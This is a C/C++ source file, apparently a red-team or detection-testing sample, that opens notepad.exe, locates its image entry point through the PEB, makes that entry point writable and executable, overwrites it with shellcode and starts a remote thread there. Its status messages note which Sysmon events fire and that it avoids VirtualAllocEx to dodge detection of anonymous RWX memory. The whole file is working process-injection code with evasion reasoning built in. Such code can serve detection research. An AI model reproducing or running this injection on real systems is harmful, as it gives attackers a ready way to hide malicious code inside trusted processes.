#include "common.h"
#include <winternl.h>

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    DWORD accessMask = PROCESS_VM_WRITE      |
                       PROCESS_VM_OPERATION  |
                       PROCESS_VM_READ       |
                       PROCESS_CREATE_THREAD |
                       PROCESS_QUERY_INFORMATION;
    wprintf(L"[+] Requested access mask: 0x%08X\n", accessMask);

    HANDLE hProc = OpenProcess(accessMask, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired\n");

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    typedef NTSTATUS(NTAPI* pNtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    auto NtQIP = (pNtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen = 0;
    NtQIP(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    PVOID imageBase = NULL;
    ReadProcessMemory(hProc,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &imageBase, sizeof(PVOID), NULL);
    wprintf(L"[+] Image base: 0x%p\n", imageBase);

    BYTE headers[0x1000] = {};
    ReadProcessMemory(hProc, imageBase, headers, sizeof(headers), NULL);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)headers;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(headers + dos->e_lfanew);
    LPVOID ep = (LPVOID)((ULONG_PTR)imageBase +
                          nt->OptionalHeader.AddressOfEntryPoint);
    wprintf(L"[+] Entry point: 0x%p\n", ep);

    DWORD oldProtect = 0;
    VirtualProtectEx(hProc, ep, shellcode_size,
                     PAGE_EXECUTE_READWRITE, &oldProtect);
    wprintf(L"[+] Protection changed — old: 0x%08X\n", oldProtect);

    SIZE_T written = 0;
    WriteProcessMemory(hProc, ep, shellcode, shellcode_size, &written);
    wprintf(L"[+] Shellcode written: %zu bytes\n", written);

    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)ep,
        NULL, 0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created at entry point\n");
    wprintf(L"[*] EID 8 StartModule should show notepad.exe not -\n");
    wprintf(L"[*] No anonymous RWX allocation — no VirtualAllocEx\n");
    wprintf(L"[*] EID 25 may fire — image modified in memory\n");

    WaitForSingleObject(hThread, 5000);
    VirtualProtectEx(hProc, ep, shellcode_size, oldProtect, &oldProtect);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
